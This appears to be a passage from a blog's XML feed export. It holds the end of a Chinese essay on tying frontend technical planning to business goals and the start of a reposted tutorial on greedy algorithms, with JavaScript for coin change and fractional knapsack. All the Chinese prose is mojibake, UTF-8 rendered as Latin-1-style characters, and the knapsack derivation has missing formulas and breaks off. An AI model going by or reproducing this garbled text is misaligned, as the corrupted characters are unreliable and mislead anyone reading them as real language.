æœªæ¥è§„åˆ’ï¼ˆèƒ½å¦è·ŸBUæˆ–é›†å›¢çš„æ–¹æ¡ˆè”åŠ¨ã€å…±å»ºï¼‰ è€Œè¿™å¾€å¾€æ˜¯å› ä¸ºä½ æå‡ºè¦åšçš„äº‹æƒ…ï¼Œæœ‰ä»·å€¼ä½†ä¸æ˜¯å¿…é¡»åšçš„ï¼Œæ²¡æœ‰ç»“åˆç›®å‰ä¸šåŠ¡éœ€è¦ä»€ä¹ˆã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½ æƒ³åšçš„æŠ€æœ¯æ˜¯ä¸ªäººå’Œçº¯æŠ€æœ¯è§’åº¦æ€è€ƒçš„ï¼Œæ²¡æœ‰åŸºäºä¸šåŠ¡çš„ç°çŠ¶å’Œç—›ç‚¹å»è€ƒè™‘æŠ€æœ¯æ–¹æ¡ˆï¼Œä¸æ¥åœ°æ°”ï¼ŒæŠ•å…¥äº§å‡ºæ¯”ä¸é«˜ã€‚ æ‰€ä»¥ç»™æŠ€æœ¯äº§å‡ºå…ˆæ‰¾å¥½ä¸šåŠ¡çš„é˜µåœ°ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥å€ŸåŠ›çš„åœ°æ–¹ï¼Œä¸è¦é‡å¤é€ è½®å­ã€‚å¿«é€ŸéªŒè¯è¿™ä¸ªæ–¹å‘çš„æ­£ç¡®æ€§åï¼Œå†é€æ¸å¤šåŠ æŠ•å…¥ã€ä¸°æ»¡æŠ€æœ¯è®¾è®¡ã€‚ä¸è¦è‡ªå·±YYã€é»˜é»˜åœ°åšå®Œï¼Œè¿™æ ·åšå‡ºæ¥çš„ä¸œè¥¿æ²¡æœ‰ä¸šåŠ¡åœºæ™¯åŸ‹å•ã€‚ â– æŠ€æœ¯è§„åˆ’ä¸šåŠ¡èµ‹èƒ½å…¶å®æ˜¯éœ€è¦æˆ‘ä»¬ç´§è´´ä¸šåŠ¡è§„åˆ’ï¼Œåˆ¶å®šæŠ€æœ¯è§„åˆ’å’Œæ–¹æ¡ˆã€‚åœ¨äº†è§£ä¸šåŠ¡æ–¹ä»Šå¹´çš„ KPI é‡ç‚¹æ˜¯ä»€ä¹ˆï¼Œé¢„è®¡çš„æ‹†è§£å’Œå®ç°è·¯å¾„æ˜¯ä»€ä¹ˆåï¼Œå†ç»“åˆè‡ªå·±çš„å’Œå›¢é˜Ÿæƒ…å†µï¼Œæƒ³æƒ³è‡ªå·±èƒ½åšå“ªäº›äº‹æƒ…æ¥å¸®åŠ©ä¸šåŠ¡å®ç°å…¶ KPIï¼Œè¿™é‡Œæœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„ä¸‹ï¼š æŠ“ä½æœ¬è´¨ä»ç‚¹åŠé¢ï¼Œé€šç›˜è€ƒè™‘: å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬æ”¶åˆ°çš„ç—›ç‚¹å’Œä¸šåŠ¡éœ€æ±‚éƒ½æ˜¯å•ç‚¹çš„ï¼Œè¿™æ—¶æˆ‘ä»¬ä¸èƒ½ç€çœ¼äºçœ¼å‰çš„å•ç‚¹é—®é¢˜ï¼Œè€Œéœ€è¦é€šç›˜æ¥è€ƒè™‘ï¼Œæ¯”å¦‚SEOçš„é¡µé¢å¯¹æ€§èƒ½éå¸¸æ•æ„Ÿï¼Œç»å¸¸å¯èƒ½ä¼šæ”¶åˆ°ä¸€äº›ä¸šåŠ¡æ–¹æ¥åé¦ˆï¼Œè¯´ç›®å‰æˆ‘ä»¬çš„SEOæœ‰è¿™ä¸ªåœ°æ–¹ï¼Œé‚£ä¸ªåœ°æ–¹éœ€è¦ä¼˜åŒ–ä¸‹ï¼Œè€Œå•ç‚¹è§£å†³è¿™äº›é—®é¢˜å¯èƒ½å¯¹ä¸šåŠ¡å¸¦æ¥çš„æ”¶ç›Šå¹¶ä¸å¤§ï¼Œå¯¹è‡ªå·±çš„æŠ€èƒ½ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæˆé•¿ã€‚è¿™æ—¶å€™å¦‚æœé€šç›˜è€ƒè™‘è¿™ä¸ªå‘½é¢˜ï¼Œå…¶å®ä¼šå‘ç°åšSEOé¡µé¢çš„ä¼˜åŒ–ï¼Œå…¶å®ç›®çš„æ˜¯ä¸ºäº†æå‡SEOé¡µé¢çš„æ”¶å½•å’Œæ’åã€‚è€Œæå‡SEOé¡µé¢çš„æ”¶å½•å’Œæ’åå…¶å®ä¸ä»…æœ‰å‰ç«¯æ€§èƒ½ä¼˜åŒ–è¿™ä¸€ä¸ªè·¯å¾„ï¼Œè€Œæ˜¯è¿˜æœ‰ä¸€äº›å…¶ä»–çš„è·¯å¾„ï¼šæ¯”å¦‚ä¼˜åŒ–å…³é”®è¯&amp;é•¿å°¾è¯ï¼Œé‡‡ç”¨Googleçš„AMPæŠ€æœ¯æ”¹é€ SEOé¡µé¢ï¼Œä¼˜åŒ–çˆ¬è™«çˆ¬å–é¡µé¢çš„è€—æ—¶æå‡çˆ¬å–ç‡ç­‰ç­‰ã€‚è¿™æ ·å°±èƒ½å§ç‚¹çš„é—®é¢˜è½¬åŒ–ä¸ºé¢çš„é—®é¢˜ï¼Œæ‰èƒ½åˆ¶å®šæ›´æœ‰æ•ˆå’Œå…¨é¢çš„æŠ“æ‰‹æ¥èµ‹èƒ½ä¸šåŠ¡ã€‚ æ—¢è¦è§£å†³çœ¼å‰ç—›ç‚¹ï¼Œä¹Ÿè¦é•¿è¿œè°‹åˆ’: å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¸èƒ½ä»…æ»¡è¶³äºçœ¼å‰çš„KPIï¼Œè¿˜éœ€è¦äº†è§£ä¸šåŠ¡æ–¹é•¿è¿œçš„æƒ³æ³•å’Œå¯ä»¥é¢„è§çš„è§„åˆ’ã€‚å°±æ¯”å¦‚è¯•ç‚¹çš„æ–°ä¸šåŠ¡ï¼Œä¸€å±‚è§„åˆ’æ˜¯ä¿è¯ä¸šåŠ¡é¡¹ç›®çš„æŒ‰æ—¶ä¸Šçº¿ï¼Œè€ƒè™‘åˆ°æœªæ¥ï¼Œå¦ä¸€å±‚è§„åˆ’å¯èƒ½å°±æ˜¯å¦‚ä½•åšåˆ°æŠ€æœ¯æ–¹æ¡ˆçš„å¯ä»¥å¤åˆ¶æ€§ã€‚ â– ç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šå½“ä½ éœ€è¦åˆ¶å®šä¸€ä¸ªäº§å“åŒ–çš„æ–¹æ¡ˆæˆ–è€…å·¥å…·å’Œæ¡†æ¶çš„æ—¶å€™ï¼Œæœ€å¥½å…ˆæ”¾çœ¼é›†å›¢å†…éƒ¨å’Œè¡Œä¸šè¿›è¡Œä¸€ç•ªè°ƒç ”ï¼Œçœ‹çœ‹ä¸šç•Œå’Œå…¶ä»–åŒäº‹æ˜¯æ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜çš„ã€‚å°½é‡ç«™åœ¨åˆ«äººçš„è‚©è†€ä¸Šåšå‡ºåˆ›æ–°æˆ–è€…å‚ä¸å…±å»ºï¼Œé¿å…å°å›¢é˜Ÿå†…é€ å‡ºé‡å¤å’Œè´¨é‡ä½çš„è½®å­ \æŠ€æœ¯æ·±åº¦** â– æŠ€æœ¯çŸ¥è¯†ä¸æŠ€æœ¯èƒ½åŠ›â€œæŠ€æœ¯â€ä¸èƒ½æ˜¯ä¸€ä¸ªç¬¼ç»Ÿçš„è¯æ±‡ï¼Œæˆ‘æƒ³å®ƒè‡³å°‘å¯ä»¥åˆ†ä¸ºâ€œæŠ€æœ¯çŸ¥è¯†â€å’Œâ€œæŠ€æœ¯èƒ½åŠ›â€ä¸¤å¤§éƒ¨åˆ†ã€‚ ä»€ä¹ˆæ˜¯â€œæŠ€æœ¯çŸ¥è¯†â€ï¼ŸçŸ¥è¯†å°±æ˜¯ I KNOW ã€ŠTypeScript ä»å…¥é—¨åˆ°æ”¾å¼ƒã€‹ ã€ŠReact ä»å…¥é—¨åˆ°æ”¾å¼ƒã€‹ ã€ŠWebpack ä»å…¥é—¨åˆ°æ”¾å¼ƒã€‹ â€¦â€¦ ä»€ä¹ˆæ˜¯â€œæŠ€æœ¯èƒ½åŠ›â€ï¼Ÿèƒ½åŠ›å°±æ˜¯ I CAN æˆ‘ç”¨ TypeScript é‡æ„äº†ä¸€ä¸ªå¤§å‹ç³»ç»Ÿï¼Œä»£ç å¥å£®æ€§åŠç ”å‘æ•ˆç‡å¤§å¹…æå‡ã€‚ æˆ‘ç”¨ React Hooks ç»™å…¨æ ˆåŒå­¦è¿›è¡Œå‰ç«¯åŸ¹è®­ï¼ŒåŸ¹è®­æ•ˆæœå¤§å¹…æå‡ã€‚ æˆ‘æ·±å…¥ç ”ç©¶äº† Webpackï¼Œä¼˜åŒ–é…ç½®ï¼Œä½¿å¾—ç³»ç»Ÿæ„å»ºé€Ÿåº¦å¤§å¹…æå‡ã€‚ â€¦.. â– åŸ¹å…»æŠ€æœ¯è§†é‡ å…³æ³¨æ—¥å¸¸ä¸šç•Œæ–°æŠ€æœ¯ã€‚ä¸ä¸€å®šè¦æ·±å…¥äº†è§£ï¼Œä½†å¯¹æ–°æŠ€æœ¯ä¿æŒå¥½å¥‡å¿ƒï¼Œå¤§æ¦‚äº†è§£å®ƒæ˜¯åšä»€ä¹ˆçš„ï¼Œå¦‚æœåœ¨å·¥ä½œä¸­é‡åˆ°åŒ¹é…çš„è½åœ°ç¯å¢ƒï¼Œå¯ä»¥è€ƒè™‘å†™ä¸ª demo çœ‹çœ‹æ˜¯ä¸æ˜¯æœ‰ä»·å€¼ å…³æ³¨é›†å›¢å’Œä¸šç•Œçš„è§£å†³æ–¹æ¡ˆã€‚åœ¨ä¸šåŠ¡ä¸­å‘ç°é—®é¢˜ï¼Œåšè§£å†³æ–¹æ¡ˆçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“é™·å…¥è‡ªå·±çš„è®¾è®¡ä¸­ï¼Œä¸€è„‘å­åœ°æƒ³æŠŠæ‰€æœ‰ä¸œè¥¿éƒ½è‡ªå·±åšå‡ºæ¥ï¼Œä½†æŠ•å…¥ä¼šéå¸¸å¤§ï¼Œäº§å‡ºçš„ä»·å€¼æ˜¯å¦ä¸€æ ·å¤§å‘¢ï¼Ÿä¸çŸ¥é“ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œä½ æƒ³åšçš„ï¼Œåœ¨ATAèƒ½æœåˆ°ï¼Œå‰äººè¸©çš„å‘ï¼Œæˆ–è€…å·²æœ‰çš„æˆç†Ÿçš„è§£å†³æ–¹æ¡ˆï¼Œåªè¦ä½ å»æ²Ÿé€šå»æ¥è§¦ï¼Œå°±å¯ä»¥è½»æ¾åœ°æ¥è¿›æ¥ï¼Œä¸ºä»€ä¹ˆè¦èŠ±å¤§é‡çš„æ—¶é—´å»é€ è½®å­å‘¢ï¼Ÿå¯ä»¥å€ŸåŠ›çš„åœ°æ–¹ï¼Œå°±å»å€ŸåŠ›å§ï¼ŒæŠŠæ—¶é—´å‰©ä¸‹æ¥ï¼Œåšä½ çš„è§£å†³æ–¹æ¡ˆä¸­æ›´æ ¸å¿ƒæ›´æœ‰ä»·å€¼çš„äº‹æƒ…ã€‚ â– æŠ€æœ¯æ·±åº¦ä¸€èŠåˆ°â€œæŠ€æœ¯æ·±åº¦â€ï¼Œå¯èƒ½å¾ˆè‡ªç„¶åœ°ä¼šè®¤ä¸ºæ˜¯åœ¨æŸé¡¹æŠ€æœ¯ä¸ŠæŒ–å¾—å¾ˆæ·±ï¼Œæˆ–è€…è§£å†³äº†ä¸€ä¸ªä¸šç•Œå…¬è®¤éš¾åº¦å¾ˆé«˜çš„æŠ€æœ¯éš¾é¢˜ï¼Œä½†è¿™åªæ˜¯â€œæŠ€æœ¯æ·±åº¦â€çš„å…¶ä¸­ä¸€éƒ¨åˆ†ï¼š ä½“ç³»åŒ– / ç³»ç»ŸåŒ–ä½“ç³»åŒ–æ€ç»´æ˜¯è®¤è¯†äº‹ç‰©çš„ä¸€ç§æ–¹å¼ï¼Œåœ¨é¢å¯¹é—®é¢˜çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé’ˆå¯¹å¤æ‚çš„é—®é¢˜ï¼Œåˆ—å‡ºå…³é”®çš„è¦ç´ å’Œè§£å†³æ–¹æ³•ï¼Œå°†æ•£ä¹±æ— åºçš„é—®é¢˜ï¼Œå˜å¾—é€»è¾‘æ¸…æ™°ï¼Œæœ‰ç« å¯å¾ªã€‚åœ¨é—®é¢˜çš„å®šä½å’Œè§£å†³çš„ä½“ç°ï¼Œä»è¡¨è±¡åˆ°æœ¬è´¨ï¼Œæ‹†è§£å‡ºé€ æˆé—®é¢˜èƒŒåçš„åŸå› ï¼Œé’ˆå¯¹æ€§åœ°å»è§£å†³æœ¬è´¨çš„åŸå› ï¼Œè€Œéæ²»æ ‡ä¸æ²»æœ¬ï¼Œæœ‰è§£å†³æ–¹æ¡ˆæœ‰èŠ‚å¥åœ°è§£å†³ã€‚ å…¨é“¾è·¯é™¤äº†å‰ç«¯çš„éƒ¨åˆ†ï¼Œå‘å‰å‘åçš„æŠ€æœ¯æ ˆï¼Œè¿˜èƒ½æŒ–å¤šæ·±ã€‚ å•ç‚¹æŠ€æœ¯æŒ‘æˆ˜åœ¨æŸä¸ªæŠ€æœ¯æŒ‘æˆ˜ä¸Šï¼Œä½ çš„æ€è€ƒå’Œè§£å†³æ–¹æ¡ˆæ˜¯æ€æ ·çš„ã€‚ â– æŠ€æœ¯ä¸ä¸šåŠ¡å…±èµ¢çœŸæ­£æœ‰çªç ´æ€§çš„ã€å¸¦æ¥é‡å¤§ä»·å€¼çš„ä¸šåŠ¡æˆæœå¿…ç„¶ä¼´éšç€æŠ€æœ¯ä¸Šçš„æ·±å…¥ä¹ƒè‡³åˆ›æ–°ï¼Œæ‰€ä»¥åœ¨åšä¸šåŠ¡æˆæœçš„æ—¶å€™ï¼Œä¸€å®šä¼šæœ‰è®©æˆ‘ä»¬å¢åŠ æŠ€æœ¯æ·±åº¦çš„åœºæ™¯]]></content>
      <categories>
        <category>å…¶ä»–</category>
      </categories>
      <tags>
        <tag>å…¶ä»–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯ä¹Ÿèƒ½å­¦ç®—æ³•ï¼šç”±æµ…å…¥æ·±è®²è§£è´ªå¿ƒç®—æ³•]]></title>
    <url>%2F2020%2F03%2F19%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%2F%E5%89%8D%E7%AB%AF%E4%B9%9F%E8%83%BD%E5%AD%A6%E7%AE%97%E6%B3%95%EF%BC%9A%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E8%AE%B2%E8%A7%A3%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5e575e02f265da573b0dad5f è´ªå¿ƒç®—æ³•æ˜¯ä¸€ç§å¾ˆå¸¸è§çš„ç®—æ³•æ€æƒ³ï¼Œè€Œä¸”å¾ˆå¥½ç†è§£ï¼Œå› ä¸ºå®ƒç¬¦åˆäººä»¬ä¸€èˆ¬çš„æ€ç»´ä¹ æƒ¯ã€‚ä¸‹é¢æˆ‘ä»¬ç”±æµ…å…¥æ·±çš„æ¥è®²è®²è´ªå¿ƒç®—æ³•ã€‚ æ‰¾é›¶é—®é¢˜æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„é—®é¢˜ï¼š å‡è®¾ä½ æ˜¯ä¸€ä¸ªå•†åº—è€æ¿ï¼Œä½ éœ€è¦ç»™é¡¾å®¢æ‰¾é›¶nå…ƒé’±ï¼Œä½ æ‰‹ä¸Šæœ‰çš„é’±çš„é¢å€¼ä¸ºï¼š100å…ƒï¼Œ50å…ƒï¼Œ20å…ƒï¼Œ5å…ƒï¼Œ1å…ƒã€‚è¯·é—®å¦‚ä½•æ‰¾é›¶ä½¿å¾—æ‰€éœ€è¦çš„é’±å¸æ•°é‡æœ€å°‘ï¼Ÿ ä¾‹å­ï¼šä½ éœ€è¦æ‰¾é›¶126å…ƒï¼Œåˆ™æ‰€éœ€é’±å¸æ•°é‡æœ€å°‘çš„æ–¹æ¡ˆä¸º100å…ƒ1æ‰¾ï¼Œ20å…ƒ1å¼ ï¼Œ5å…ƒ1å¼ ï¼Œ1å…ƒ1å¼ ã€‚ è¿™ä¸ªé—®é¢˜åœ¨ç”Ÿæ´»ä¸­å¾ˆå¸¸è§ï¼Œä¹°ä¸œè¥¿çš„æ—¶å€™ç»å¸¸ä¼šé‡åˆ°ï¼Œé‚£æˆ‘ä»¬ä¸€èˆ¬æ˜¯æ€ä¹ˆæ€è€ƒçš„å‘¢ï¼Ÿå‡è®¾æˆ‘ä»¬éœ€è¦æ‰¾é›¶126å…ƒï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹èƒ½æ‰¾çš„æœ€å¤§é¢å€¼æ˜¯å¤šå°‘ï¼Œæˆ‘ä»¬å‘ç°126æ¯”100å¤§ï¼Œé‚£è‚¯å®šå¯ä»¥æ‰¾ä¸€å¼ 100å—ï¼Œç„¶åå‰©ä¸‹26å…ƒï¼Œå†çœ‹26èƒ½åŒ¹é…çš„æœ€å¤§é¢å€¼æ˜¯å¤šå°‘ï¼Œå‘ç°æ˜¯20ï¼Œé‚£æ‰¾ä¸€å¼ 20çš„ï¼Œè¿˜å‰©6å—ï¼ŒåŒæ ·çš„æ€è·¯ï¼Œæ‰¾ä¸€å¼ 5å—çš„å’Œ1å—çš„ã€‚è¿™å…¶å®å°±æ˜¯è´ªå¿ƒç®—æ³•çš„æ€æƒ³ï¼Œæ¯æ¬¡éƒ½å¾ˆè´ªå¿ƒçš„å»æ‰¾æœ€å¤§çš„åŒ¹é…é‚£ä¸ªå€¼ï¼Œç„¶åå†æ‰¾æ¬¡å¤§çš„ã€‚è¿™ä¸ªç®—æ³•ä»£ç ä¹Ÿå¾ˆå¥½å†™ï¼š 1234567891011121314151617181920const allMoney = [100, 50, 20, 5, 1]; // è¡¨ç¤ºæˆ‘ä»¬æ‰‹ä¸Šæœ‰çš„é¢å€¼function changeMoney(n, allMoney) &#123; const length = allMoney.length; const result = []; // å­˜å‚¨ç»“æœçš„æ•°ç»„ï¼Œæ¯é¡¹è¡¨ç¤ºå¯¹åº”é¢å€¼çš„å¼ æ•° for(let i = 0; i &lt; length; i++) &#123; if(n &gt;= allMoney[i]) &#123; // å¦‚æœéœ€è¦æ‰¾çš„é’±æ¯”é¢å€¼å¤§ï¼Œé‚£å°±å¯ä»¥æ‰¾ï¼Œé™¤ä¸€ä¸‹çœ‹çœ‹èƒ½æ‰¾å‡ å¼  result[i] = parseInt(n / allMoney[i]); n = n - result[i] * allMoney[i]; // æ›´æ–°å‰©ä¸‹éœ€è¦æ‰¾çš„é’± &#125; else &#123; // å¦åˆ™ä¸èƒ½æ‰¾ result[i] = 0; &#125; &#125; return result;&#125;const result = changeMoney(126, allMoney);console.log(result); // [1, 0, 1, 1, 1] è´ªå¿ƒç®—æ³•ä¸Šé¢çš„æ‰¾é›¶é—®é¢˜å°±æ˜¯è´ªå¿ƒç®—æ³•ï¼Œæ¯æ¬¡éƒ½å»è´ªæœ€å¤§é¢å€¼çš„ï¼Œå‘ç°è´ªä¸äº†äº†ï¼Œå†å»è´ªæ¬¡å¤§çš„ã€‚ä»æ¦‚å¿µä¸Šè®²ï¼Œè´ªå¿ƒç®—æ³•æ˜¯ï¼š ä»ä¸Šé¢çš„å®šä¹‰å¯ä»¥çœ‹å‡ºï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰é—®é¢˜éƒ½å¯ä»¥ç”¨è´ªå¿ƒç®—æ³•æ¥æ±‚è§£çš„ï¼Œå› ä¸ºå®ƒæ¯æ¬¡æ‹¿åˆ°çš„åªæ˜¯å±€éƒ¨æœ€ä¼˜è§£ï¼Œå±€éƒ¨æœ€ä¼˜è§£ç»„åˆèµ·æ¥å¹¶ä¸ä¸€å®šæ˜¯å…¨å±€æœ€ä¼˜è§£ã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªè¿™æ ·çš„ä¾‹å­ï¼š èƒŒåŒ…é—®é¢˜èƒŒåŒ…é—®é¢˜ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆç»å…¸çš„ç®—æ³•é—®é¢˜ï¼Œé¢˜ç›®å¦‚ä¸‹ï¼š æœ‰ä¸€ä¸ªå°å·ï¼Œä»–è¿›åˆ°äº†ä¸€ä¸ªåº—é‡Œè¦å·ä¸œè¥¿ï¼Œåº—é‡Œæœ‰å¾ˆå¤šä¸œè¥¿ï¼Œæ¯ä¸ªä¸œè¥¿çš„ä»·å€¼æ˜¯vï¼Œæ¯ä¸ªä¸œè¥¿çš„é‡é‡æ˜¯wã€‚ä½†æ˜¯å°å·åªæœ‰ä¸€ä¸ªèƒŒåŒ…ï¼Œä»–èƒŒåŒ…æ€»å…±èƒ½æ‰¿å—çš„é‡é‡æ˜¯Wã€‚è¯·é—®æ€ä¹ˆæ‹¿ä¸œè¥¿èƒ½è®©ä»–æ‹¿åˆ°çš„ä»·å€¼æœ€å¤§ï¼Ÿ å…¶å®èƒŒåŒ…é—®é¢˜ç»†åˆ†ä¸‹æ¥åˆå¯ä»¥åˆ†æˆä¸¤ä¸ªé—®é¢˜ï¼š0-1èƒŒåŒ…å’Œåˆ†æ•°èƒŒåŒ…ã€‚ 0-1èƒŒåŒ…ï¼šæŒ‡çš„æ˜¯å¯¹äºæŸä¸ªå•†å“æ¥è¯´ï¼Œä½ è¦ä¹ˆä¸æ‹¿ï¼Œè¦ä¹ˆå…¨æ‹¿èµ°ï¼Œä¸èƒ½åªæ‹¿ä¸€åŠæˆ–è€…åªæ‹¿ä¸‰åˆ†ä¹‹äºŒã€‚å¯ä»¥å°†å•†å“ç†è§£æˆé‡‘ç –ï¼Œä½ è¦ä¹ˆæ•´å—æ‹¿èµ°ï¼Œè¦ä¹ˆä¸æ‹¿ï¼Œä¸èƒ½æ‹¿åŠå—ã€‚ åˆ†æ•°èƒŒåŒ…ï¼šåˆ†æ•°èƒŒåŒ…å°±æ˜¯è·Ÿ0-1èƒŒåŒ…ç›¸åçš„ï¼Œä½ å¯ä»¥åªæ‹¿ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥æ‹¿ä¸€åŠï¼Œä¹Ÿå¯ä»¥æ‹¿ä¸‰åˆ†ä¹‹äºŒã€‚å¯ä»¥å°†å•†å“ç†è§£æˆé‡‘ç ‚ï¼Œå¯ä»¥åªæ‹¿ä¸€éƒ¨åˆ†ã€‚ ä¸‹é¢æ¥çœ‹ä¸ªä¾‹å­ï¼š è¿™ä¸ªé—®é¢˜ç”¨æˆ‘ä»¬å¹³æ—¶çš„æ€ç»´ä¹Ÿå¾ˆå¥½æƒ³ï¼Œè¦æ‹¿åˆ°æ€»ä»·å€¼æœ€å¤§ï¼Œé‚£æˆ‘ä»¬å°±è´ªå‘—ï¼Œå°±æ‹¿æœ€è´µçš„ï¼Œå³ä»·å€¼é™¤ä»¥é‡é‡çš„æ•°æœ€å¤§çš„ã€‚ä½†æ˜¯æ¯æ¬¡éƒ½æ‹¿æœ€è´µçš„ï¼Œæ˜¯ä¸æ˜¯æœ€åæ€»ä»·å€¼æœ€å¤§å‘¢ï¼Ÿæˆ‘ä»¬å…ˆå‡è®¾ä¸Šé¢çš„ä¾‹å­æ˜¯0-1èƒŒåŒ…ï¼Œæœ€è´µçš„æ˜¯v1ï¼Œç„¶åæ˜¯v2ï¼Œv3ã€‚æˆ‘ä»¬å…ˆæ‹¿v1, èƒŒåŒ…è¿˜å‰©40ï¼Œæ‹¿åˆ°æ€»ä»·å€¼æ˜¯60ï¼Œç„¶åæ‹¿v2ï¼ŒèƒŒåŒ…è¿˜å‰©20ï¼Œæ‹¿åˆ°æ€»ä»·å€¼æ˜¯160ã€‚ç„¶åå°±æ‹¿ä¸ä¸‹äº†ï¼Œå› ä¸ºv3çš„é‡é‡æ˜¯30ï¼Œæˆ‘ä»¬èƒŒåŒ…åªå‰©20äº†ï¼Œè£…ä¸ä¸‹äº†ã€‚ä½†æ˜¯è¿™ä¸ªæ˜¾ç„¶ä¸æ˜¯å…¨å±€æœ€ä¼˜è§£ï¼Œå› ä¸ºæˆ‘ä»¬æ˜æ˜¾å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœæˆ‘ä»¬æ‹¿v2ï¼Œv3ï¼ŒèƒŒåŒ…åˆšå¥½è£…æ»¡ï¼Œæ€»ä»·å€¼æ˜¯220ï¼Œè¿™æ‰æ˜¯æœ€ä¼˜è§£ã€‚æ‰€ä»¥0-1èƒŒåŒ…é—®é¢˜ä¸èƒ½ç”¨è´ªå¿ƒç®—æ³•ã€‚ ä½†æ˜¯åˆ†æ•°èƒŒåŒ…å¯ä»¥ç”¨è´ªå¿ƒï¼Œå› ä¸ºæˆ‘ä»¬æ€»æ˜¯å¯ä»¥æ‹¿æœ€è´µçš„ã€‚æˆ‘ä»¬å…ˆæ‹¿äº†v1, v2ï¼Œå‘ç°v3è£…ä¸ä¸‹äº†ï¼Œé‚£å°±ä¸è£…å®Œäº†å˜›ï¼Œè£…ä¸‰åˆ†ä¹‹äºŒå°±è¡Œäº†ã€‚ä¸‹é¢æˆ‘ä»¬ç”¨è´ªå¿ƒæ¥å®ç°ä¸€ä¸ªåˆ†æ•°èƒŒåŒ…ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556const products = [ &#123;id:1, v: 60, w: 10&#125;, &#123;id:2, v: 100, w: 20&#125;, &#123;id:3, v: 120, w: 30&#125;]; // æ–°å»ºä¸€ä¸ªæ•°ç»„è¡¨ç¤ºå•†å“åˆ—è¡¨ï¼Œæ¯ä¸ªå•†å“åŠ ä¸ªidç”¨äºæ ‡è¯†function backpack(W, products) &#123; const sortedProducts = products.sort((product1, product2) =&gt; &#123; const price1 = product1.v / product1.w; const price2 = product2.v / product2.w; if(price1 &gt; price2) &#123; return -1; &#125; else if(price1 &lt; price2) &#123; return 1; &#125; return 0; &#125;); // å…ˆå¯¹å•†å“æŒ‰ç…§ä»·å€¼ä»å¤§åˆ°å°æ’åº const result = []; // æ–°å»ºæ•°ç»„æ¥æ”¶ç»“æœ let allValue = 0; // æ‹¿åˆ°çš„æ€»ä»·å€¼ const length = sortedProducts.length; for(let i = 0; i &lt; length; i++) &#123; const sortedProduct = sortedProducts[i]; if(W &gt;= sortedProduct.w) &#123; // æ•´ä¸ªæ‹¿å®Œ result.push(&#123; id: sortedProduct.id, take: 1, // æ‹¿çš„æ•°é‡ &#125;); W = W - sortedProduct.w; allValue = allValue + sortedProduct.v; &#125; else if(W &gt; 0) &#123; // åªèƒ½æ‹¿ä¸€éƒ¨åˆ† result.push(&#123; id: sortedProduct.id, take: W / sortedProduct.w, &#125;); allValue = allValue + sortedProduct.v * (W / sortedProduct.w); W = 0; // è£…æ»¡äº† &#125; else &#123; // ä¸èƒ½æ‹¿äº† result.push(&#123; id: sortedProduct.id, take: 0, &#125;); &#125; &#125; return &#123;result: result, allValue: allValue&#125;;&#125;// æµ‹è¯•ä¸€ä¸‹const result = backpack(50, products);console.log(result); è¿è¡Œç»“æœï¼š 0-1èƒŒåŒ…å‰é¢è®²è¿‡0-1èƒŒåŒ…ä¸èƒ½ç”¨è´ªå¿ƒæ±‚è§£ï¼Œæˆ‘ä»¬è¿™é‡Œè¿˜æ˜¯è®²è®²ä»–æ€ä¹ˆæ¥æ±‚è§£å§ã€‚è¦è§£è¿™ä¸ªé—®é¢˜éœ€è¦ç”¨åˆ°åŠ¨æ€è§„åˆ’çš„æ€æƒ³ï¼Œå…³äºåŠ¨æ€è§„åˆ’çš„æ€æƒ³ï¼Œå¯ä»¥çœ‹çœ‹æˆ‘è¿™ç¯‡æ–‡ç« ï¼Œå¦‚æœä½ åªæƒ³çœ‹çœ‹è´ªå¿ƒç®—æ³•ï¼Œå¯ä»¥è·³è¿‡è¿™ä¸€éƒ¨åˆ†ã€‚å‡è®¾æˆ‘ä»¬èƒŒåŒ…æ”¾äº†nä¸ªå•†å“ï¼ŒWæ˜¯æˆ‘ä»¬èƒŒåŒ…çš„æ€»å®¹é‡ï¼Œæˆ‘ä»¬è¿™æ—¶æ‹¥æœ‰çš„æ€»ä»·å€¼æ˜¯ã€‚æˆ‘ä»¬è€ƒè™‘æœ€åä¸€æ­¥ï¼Œ å‡å¦‚æˆ‘ä»¬ä¸æ”¾æœ€åä¸€ä¸ªå•†å“ï¼Œåˆ™æ€»ä»·å€¼ä¸º å‡è®¾æˆ‘ä»¬æ”¾äº†æœ€åä¸€ä¸ªå•†å“ï¼Œåˆ™æ€»ä»·å€¼ä¸ºæœ€åä¸€ä¸ªå•†å“åŠ ä¸Šå‰é¢å·²ç»æ”¾äº†çš„ä»·å€¼ï¼Œè¡¨ç¤ºä¸ºï¼Œè¿™æ—¶å€™éœ€è¦æ»¡è¶³çš„æ¡ä»¶æ˜¯ï¼Œå³æœ€åä¸€ä¸ªè¦æ”¾å¾—ä¸‹ã€‚ æˆ‘ä»¬è¦æ±‚çš„æœ€å¤§è§£å…¶å®å°±æ˜¯ä¸Šè¿°ä¸¤ä¸ªæ–¹æ¡ˆçš„æœ€å¤§å€¼ï¼Œè¡¨ç¤ºå¦‚ä¸‹ï¼š 